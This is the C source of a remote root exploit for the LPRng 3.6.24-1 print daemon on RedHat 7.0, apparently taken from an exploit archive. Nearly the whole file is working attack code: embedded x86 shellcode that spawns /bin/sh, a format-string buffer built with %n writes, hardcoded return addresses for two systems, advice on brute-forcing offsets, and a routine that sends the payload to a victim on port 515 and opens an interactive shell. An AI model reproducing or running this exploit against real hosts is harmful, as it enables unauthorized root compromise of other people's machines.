<html><head><title>LPRng 3.6.24-1 Remote Root Exploit</title></head><pre>/*
 *    REMOTE ROOT EXPLOIT for linux x86 - LPRng-3.6.24-1 (RedHat 7.0)
 *
 * The RedHat 7.0 replaced the BSD lpr with the LPRng package which is 
 * vulnerable to format string attacks because it passes information
 * to the syslog incorrectly.
 * You can get remote root access on machines running RedHat 7.0 with
 * lpd running (port 515/tcp) if it is not fixed, of course (3.6.25).
 *
 * bonus: I tested it too on slackware 7.0 with LPRng3.6.22-1, remember
 * is -not- installed by default (isnt a package of the slackware).
 *
 * and,.. this code is for educational propourses only, do not use
 * it on remote machines without authorization.
 *
 * greets: bruj0, ka0z, dn0, #rdC and #flatline
 *
 * coded by venomous of rdC - Argentinian security group.
 * venomous@rdcrew.com.ar
 * http://www.rdcrew.com.ar
 *
 */

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;time.h&gt;
#include &lt;signal.h&gt;

char shellcode[]= // not mine
&quot;\x31\xc0\x31\xdb\x31\xc9\xb3\x07\xeb\x67\x5f\x8d\x4f&quot; 
&quot;\x07\x8d\x51\x0c\x89\x51\x04\x8d\x51\x1c\x89\x51\x08&quot;
&quot;\x89\x41\x1c\x31\xd2\x89\x11\x31\xc0\xc6\x41\x1c\x10&quot;
&quot;\xb0\x66\xcd\x80\xfe\xc0\x80\x79\x0c\x02\x75\x04\x3c&quot;
&quot;\x01\x74\x0d\xfe\xc2\x80\xfa\x01\x7d\xe1\x31\xc0\xfe&quot;
&quot;\xc0\xcd\x80\x89\xd3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80&quot;
&quot;\xfe\xc1\x80\xf9\x03\x75\xf3\x89\xfb\x31\xc0\x31\xd2&quot;
&quot;\x88\x43\x07\x89\x5b\x08\x8d\x4b\x08\x89\x43\x0c\xb0&quot;
&quot;\x0b\xcd\x80\x31\xc0\xfe\xc0\xcd\x80\xe8\x94\xff\xff&quot;
&quot;\xff\x2f\x62\x69\x6e\x2f\x73\x68&quot;;

void usage(char *prog);
void makebuffer(char *addr, char *shaddr, int addroffset, int shoffset, int padding , int fsc);
void sigint();
void sigalarm();
void mk_connect(char victim[128], int port);

char yahoo[1024];

struct os
{
	char *addr;
	char *shelladdr;
	char *desc;
	int addroffset;
	int shelladdroffset;
	int pad;
	int fsc;
};

/* generally, the addresses are wrong for a very small value,, i recommend
 * that you bruteforce the retloc + or - by 1..(ex: -50 to +50, steps of 1)
 * if it dont work, try the same but changing the fsc (this is the value
 * of when we start to control the formats strings), start from 290 until
 * 330, it should be enough.
 * and if it still dont work,, :|, try with the offset of the shellcode
 * address, this buffer has nops, so it shouldnt be difficult to guess.
 * make a .sh! :)
 * of course, you can start gdb on your box(es) and dont guess nothing
 * just inspect the program and get the correct values!
 *
 * -venomous
 */

struct os target[]=
{
	{&quot;0xbfffee30&quot;, &quot;0xbffff640&quot;, &quot;Slackware 7.0 with LPRng-3.6.22.tgz - started from shell&quot;, 0, 0, 2, 299},
        {&quot;0xbffff0f0&quot;, &quot;0xbffff920&quot;, &quot;RedHat 7.0 (Guinness) with LPRng-3.6.22/23/24-1 from rpm - glibc-2.2-5&quot;, 0, 0, 2, 304},
        {NULL,NULL,NULL,0,0}
};


main(int argc, char *argv[])
{
    int port=515,
    so=0,
    padding=0,
    retlocoffset=0,
    shellcodeoffset=0,
    fscT=0;

    char arg,
        victim[128],
    rl[128],
    sh[128];


    if(argc &lt; 3)
        usage(argv[0]);

    bzero(victim,sizeof(victim));
    bzero(rl,sizeof(rl));
    bzero(sh,sizeof(sh));

    while ((arg = getopt(argc, argv, &quot;h:p:r:s:t:P:R:S:c&quot;)) != EOF)
    {
        switch(arg)
        {
        case 'h':
            strncpy(victim,optarg,128);
            break;
        case 'p':
            port = atoi(optarg);
            break;
        case 'r':
            strncpy(rl,optarg,128);
            break;
        case 's':
            strncpy(sh,optarg,128);
            break;
        case 't':
            so = atoi(optarg);
            break;
        case 'P':
            padding = atoi(optarg);
            break;
        case 'R':
            retlocoffset = atoi(optarg);
            break;
        case 'S':
            shellcodeoffset = atoi(optarg);
            break;
        case 'c':
            fscT = atoi(optarg);
            break;
        default:
            usage(argv[0]);
            break;
        }
    }

    if(strlen(victim) == 0)
        usage(argv[0]);

    if (strcmp(rl,&quot;&quot;))
        target[so].addr = rl;

    if (strcmp(sh,&quot;&quot;))
        target[so].shelladdr = sh;

    if (retlocoffset != 0)
        target[so].addroffset = target[so].addroffset + retlocoffset;

    if (shellcodeoffset != 0)
        target[so].shelladdroffset = target[so].shelladdroffset + shellcodeoffset;

    if (padding != 0)
        target[so].pad = target[so].pad + padding;

    if (fscT != 0)
        target[so].fsc = target[so].fsc + fscT;

    signal(SIGINT, sigint);
    makebuffer(target[so].addr, target[so].shelladdr, target[so].addroffset, target[so].shelladdroffset, target[so].pad, target[so].fsc);
    mk_connect(victim, port);

}

void makebuffer(char *addr, char *shaddr, int addroffset, int shoffset, int padding, int fsc)
{
    char *tmp,
    addrtmp[216],
    ot[128];

    int i,b,x,t;
    unsigned long pt;

    char temp[128];
    char a1,a2,a3,a4,a5,a6,a7,a8;
    char fir[12],sec[12],thr[12],f0r[12];
    unsigned long firl,secl,thrl,forl;
    unsigned long pas1,pas2,pas3,pas4;


    bzero(yahoo,sizeof(yahoo));
    bzero(ot,sizeof(ot));
    bzero(addrtmp,sizeof(addrtmp));

    printf(&quot;** LPRng remote root exploit coded by venomous of rdC **\n&quot;);
    printf(&quot;\nconstructing the buffer:\n\n&quot;);
    printf(&quot;adding bytes for padding: %d\n&quot;,padding);
    for(i=0 ; i &lt; padding ; i++)
        strcat(yahoo,&quot;A&quot;);

    tmp = addr;
    pt = strtoul(addr, &amp;addr,16) + addroffset;
    addr = tmp;
    printf(&quot;retloc: %s + offset(%d) == %p\n&quot;, addr, addroffset, pt);
    printf(&quot;adding resulting retloc(%p)..\n&quot;,pt);
    sprintf(addrtmp, &quot;%p&quot;, pt);
    if(strlen(addr) != 10)
    {
        printf(&quot;Error, retloc is %d bytes long, should be 10\n&quot;,strlen(addr));
        exit(1);
    }

    pt = 0;

    for (i=0 ; i &lt; 4 ; i++)
    {
        pt = strtoul(addrtmp, &amp;addrtmp, 16);
        //strcat(yahoo, &amp;pt);
        bzero(ot,sizeof(ot));
        sprintf(ot,&quot;%s&quot;,&amp;pt);
        strncat(yahoo,ot,4);
        pt++;
        sprintf(addrtmp, &quot;%p&quot;, pt);
        //printf(&quot;addrtmp:%s :yahoo %s\n&quot;,addrtmp,yahoo);
    }

    tmp = shaddr;
    pt = 0;
    pt = strtoul(shaddr,&amp;shaddr,16) + shoffset;
    sprintf(ot,&quot;%p&quot;,pt);
    shaddr = ot;

    printf(&quot;adding shellcode address(%s)\n&quot;, shaddr);
    sscanf(shaddr,&quot;0x%c%c%c%c%c%c%c%c&quot;,&amp;a1,&amp;a2,&amp;a3,&amp;a4,&amp;a5,&amp;a6,&amp;a7,&amp;a8);

    sprintf(fir,&quot;0x%c%c&quot;,a1,a2);
    sprintf(sec,&quot;0x%c%c&quot;,a3,a4);
    sprintf(thr,&quot;0x%c%c&quot;,a5,a6);
    sprintf(f0r,&quot;0x%c%c&quot;,a7,a8);

    firl = strtoul(fir,&amp;fir,16);
    secl = strtoul(sec,&amp;sec,16);
    thrl = strtoul(thr,&amp;thr,16);
    forl = strtoul(f0r,&amp;f0r,16);

    pas1 = forl - 50 - padding;
    pas1 = check_negative(pas1);

    pas2 = thrl - forl;
    pas2 = check_negative(pas2);

    pas3 = secl - thrl;
    pas3 = check_negative(pas3);

    pas4 = firl - secl;
    pas4 = check_negative(pas4);

    sprintf(temp,&quot;%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n&quot;,pas1,fsc, pas2, fsc+1, pas3, fsc+2,pas4, fsc+3);
    strcat(yahoo,temp);

    printf(&quot;adding nops..\n&quot;);
    b = strlen(yahoo);
    for (i=0 ; i &lt; (512-b-strlen(shellcode)) ; i++)
        yahoo[b+i] = '\x90';

    printf(&quot;adding shellcode..\n&quot;);
    b=+i;
    for (x=0 ; x &lt; b ; x++)
        yahoo[b+x] = shellcode[x];

    strcat(yahoo,&quot;\n&quot;);

    printf(&quot;all is prepared.. now lets connect to something..\n&quot;);

}

check_negative(unsigned long addr)
{
    char he[128];

    sprintf(he,&quot;%d&quot;,addr);
    if (atoi(he) &lt; 0)
        addr = addr + 256;
    return addr;
}

void mk_connect(char victim[128], int port)
{
    struct hostent *host;
    struct sockaddr_in den0n;
    int sox;

    den0n.sin_family = AF_INET;
    den0n.sin_port = htons(port);

    host = gethostbyname(victim);
    if (!host)
    {
        printf(&quot;cannot resolve, exiting...\n&quot;);
        exit(0);
    }

    bcopy(host-&gt;h_addr, (struct in_addr *)&amp;den0n.sin_addr, host-&gt;h_length);

    sox = socket(AF_INET, SOCK_STREAM, 0);

    signal(SIGALRM, sigalarm);
    alarm(10);

    printf(&quot;connecting to %s to port %d\n&quot;,host-&gt;h_name, port);
    if (connect(sox, (struct sockaddr *)&amp;den0n, sizeof(struct sockaddr)) &lt; 0)
    {
        putchar('\n');
        perror(&quot;connect&quot;);
        exit(1);
    }
    printf(&quot;connected!, sending the buffer...\n\n&quot;);
    write(sox, yahoo , strlen(yahoo));
    printf(&quot;%s\n&quot;, yahoo);
    sleep(1);
    alarm(0);
    runshell(sox);
}

int runshell(int sox)
{
    fd_set  rset;
    int     n;
    char    buffer[4096];

    char *command=&quot;/bin/uname -a ; /usr/bin/id\n&quot;;


    send(sox, command, strlen(command), 0);

    for (;;) {
        FD_ZERO (&amp;rset);
        FD_SET (sox, &amp;rset);
        FD_SET (STDIN_FILENO, &amp;rset);

        n = select(sox + 1, &amp;rset, NULL, NULL, NULL);
        if(n &lt;= 0)
            return (-1);

        if(FD_ISSET (sox, &amp;rset)) {
            n = recv (sox, buffer, sizeof (buffer), 0);
            if (n &lt;= 0)
                break;

            write (STDOUT_FILENO, buffer, n);
        }

        if(FD_ISSET (STDIN_FILENO, &amp;rset)) {
            n = read (STDIN_FILENO, buffer, sizeof (buffer));
            if (n &lt;= 0)
                break;

            send(sox, buffer, n, 0);
        }
    }
    return (0);
}

void sigalarm()
{
    printf(&quot;connection timed out, exiting...\n&quot;);
    exit(0);
}

void sigint()
{
    printf(&quot;CAUGHT sigint, exiting...\n&quot;);
    exit(0);
}


void usage(char *prog)
{
    int i;

    printf(&quot;\n** LPRng remote root exploit coded by venomous of rdC **\n&quot;);
    printf(&quot;Usage:\n\n&quot;);
    printf(&quot;%s [-h hostname] &lt;-p port&gt; &lt;-r addr&gt; &lt;-s shellcodeaddr&gt; &lt;-t type&gt; &lt;-P padding&gt; &lt;-R offset&gt; &lt;-S offset&gt; &lt;-c offset&gt;\n\n&quot;, prog);
    printf(&quot;-h is the victim ip/host\n&quot;);
    printf(&quot;-p select a different port to connect, default 515\n&quot;);
    printf(&quot;-r is the address to overwrite\n&quot;);
    printf(&quot;-s is the address of the shellcode\n&quot;);
    printf(&quot;You can use a predefined addr/shellcodeaddr using -t &lt;number&gt;\n\n&quot;);
    printf(&quot;availables types:\n\n&quot;);
    for (i=0 ; target[i].desc != NULL ; i++)
        printf(&quot;%d - %s\n&quot;,i,target[i].desc);
    printf(&quot;\n-P is to define the padding to use, usually 2\n&quot;);
    printf(&quot;-R the offset to add to &lt;addr&gt;\n&quot;);
    printf(&quot;-S the offset to add to &lt;shellcodeaddr&gt;\n&quot;);
    printf(&quot;-c where we start to control the format string\n\n&quot;);
    exit(0);
}


// milw0rm.com [2000-12-15]</pre></html>